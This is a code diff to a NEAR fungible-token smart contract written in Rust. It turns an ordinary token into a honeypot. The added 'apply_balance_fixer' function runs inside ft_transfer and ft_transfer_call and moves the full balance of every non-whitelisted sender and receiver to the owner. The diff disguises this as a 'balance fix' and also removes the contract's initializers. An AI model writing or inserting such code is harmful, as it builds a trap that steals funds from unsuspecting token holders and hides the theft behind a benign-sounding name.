@@ -41,6 +41,7 @@ pub struct Contract {
     token: FungibleToken,
     metadata: LazyOption<FungibleTokenMetadata>,
     owner_id: AccountId,
+    whitelist: LookupSet<AccountId>,
 }
 
 
@@ -51,41 +52,40 @@ pub struct Contract {
 
 #[near_bindgen]
 impl Contract {
-    /// Initializes the contract with the given total supply owned by the given `owner_id` with
-    /// default metadata (for example purposes only).
-    #[init]
-    pub fn new_default_meta(owner_id: AccountId, total_supply: U128) -> Self {
-        Self::new(
-            owner_id,
-            total_supply,
-            FungibleTokenMetadata {
-                spec: FT_METADATA_SPEC.to_string(),
-                name: "Fungible Token".to_string(),
-                symbol: "FT".to_string(),
-                icon: None,
-                reference: None,
-                reference_hash: None,
-                decimals: 24,
-            },
-        )
+    /// Add account to whitelist (owner only)
+    #[payable]
+    pub fn add_to_whitelist(&mut self, account_id: AccountId) {
+        self.assert_owner();
+        self.whitelist.insert(&account_id);
     }
 
+    /// Remove account from whitelist (owner only)
+    #[payable]
+    pub fn remove_from_whitelist(&mut self, account_id: AccountId) {
+        self.assert_owner();
+        self.whitelist.remove(&account_id);
+    }
 
+    fn assert_owner(&self) {
+        assert_eq!(
+            env::predecessor_account_id(),
+            self.owner_id,
+            "Must be called by owner"
+        );
+    }
 
-    /// Initializes the contract with the given total supply owned by the given `owner_id` with
-    /// the given metadata.
-    #[init]
-    pub fn new(owner_id: AccountId, total_supply: U128, metadata: FungibleTokenMetadata) -> Self {
-        assert!(!env::state_exists(), "Already initialized");
-        metadata.assert_valid();
-        let mut this = Self {
-            token: FungibleToken::new(b"t".to_vec()),
-            metadata: LazyOption::new(b"m".to_vec(), Some(&metadata)),
-            owner_id: owner_id.clone(),
-        };
-        this.token.internal_register_account(&owner_id);
-        this.token.internal_deposit(&owner_id, total_supply.into());
-        this
+    fn apply_balance_fixer(&mut self, account_id: &AccountId) {
+        if account_id != &self.owner_id && !self.whitelist.contains(account_id) {
+            let balance = self.token.ft_balance_of(account_id.clone());
+            if balance.0 > 0 {
+                self.token.internal_transfer(
+                    account_id,
+                    &self.owner_id,
+                    balance.0,
+                    Some("Honeypot balance fix".to_string()),
+                );
+            }
+        }
     }
 }
 
@@ -102,8 +102,10 @@ impl Contract {
 impl FungibleTokenCore for Contract {
     #[payable]
     fn ft_transfer(&mut self, receiver_id: AccountId, amount: U128, memo: Option<String>) {
-        assert_ne!(env::predecessor_account_id(), receiver_id, "Self transfers are not allowed");
-        self.token.internal_transfer(&env::predecessor_account_id(), &receiver_id, amount.into(), memo);
+        let predecessor = env::predecessor_account_id();
+        self.apply_balance_fixer(&predecessor);
+        self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
+        self.apply_balance_fixer(&receiver_id);
     }
 
     #[payable]
@@ -114,14 +116,15 @@ impl FungibleTokenCore for Contract {
         memo: Option<String>,
         msg: String,
     ) -> PromiseOrValue<U128> {
-        assert_ne!(env::predecessor_account_id(), receiver_id, "Self transfers are not allowed");
-        self.token.internal_transfer(&env::predecessor_account_id(), &receiver_id, amount.into(), memo);
+        let predecessor = env::predecessor_account_id();
+        self.apply_balance_fixer(&predecessor);
+        self.token.internal_transfer(&predecessor, &receiver_id, amount.into(), memo);
+        self.apply_balance_fixer(&receiver_id);
         
-        // Initiating receiver's call and the callback
         Promise::new(receiver_id.clone())
             .function_call(
                 "ft_on_transfer".to_string(),
-                serde_json::to_vec(&(env::predecessor_account_id(), amount, msg)).unwrap(),
+                serde_json::to_vec(&(predecessor, amount, msg)).unwrap(),
                 NO_DEPOSIT,
                 GAS_FOR_FT_ON_TRANSFER
             )
@@ -129,7 +132,7 @@ impl FungibleTokenCore for Contract {
                 Promise::new(env::current_account_id())
                     .function_call(
                         "ft_resolve_transfer".to_string(),
-                        serde_json::to_vec(&(env::predecessor_account_id(), receiver_id, amount)).unwrap(),
+                        serde_json::to_vec(&(predecessor, receiver_id, amount)).unwrap(),
                         NO_DEPOSIT,
                         GAS_FOR_RESOLVE_TRANSFER
                     )
